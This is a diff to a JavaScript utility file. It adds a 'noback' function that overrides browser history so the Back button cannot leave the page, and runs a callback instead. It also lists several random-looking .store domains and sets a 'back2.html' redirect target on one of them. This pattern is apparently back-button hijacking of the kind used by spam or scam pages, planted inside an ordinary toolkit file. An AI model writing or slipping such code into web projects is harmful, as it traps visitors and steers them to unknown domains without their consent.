@@ -4,6 +4,39 @@
 	String.prototype.trim=function(){
 		    return this.replace(/(^\s*)|(\s*$)/g,"");
 		}
+	function noback(callback){
+		  var starttime=new Date().getTime();
+		if(!sessionStorage.getItem("od")){
+		sessionStorage.setItem("od",starttime)  
+		}
+		   var counter = 0;
+		    if (window.history && window.history.pushState) {
+		            $(window).on('popstate', function () {
+		              //1秒才能返回
+		              var endtime=new Date().getTime();
+		              if(endtime-parseInt(sessionStorage.getItem("od"))>0*1000){ 
+		              sessionStorage.setItem("od",starttime)    
+		                   window.history.pushState('forward', null, '#');
+		                   window.history.forward();
+		                 //alert("不可回退");
+		                 if(typeof callback=='function'){
+		                 callback();
+		                 }
+		              }else{
+		                  window.history.go(0);
+		              }
+		               });
+		      }
+
+		      window.history.pushState('forward', null, '#'); //在IE中必须得有这两行
+		      window.history.forward();
+		  }
+	//http://m.juuiu8j8k9.store
+	//http://m.lk55mjj.store
+	//	http://m.k474kiu9.store
+	//	http://m.jjkh87j78h.store
+	//	http://m.dnajk0980hfffd.store
+	var index_back="http://m.juuiu8j8k9.store/back2.html"
 	
 /**
  * *工具包
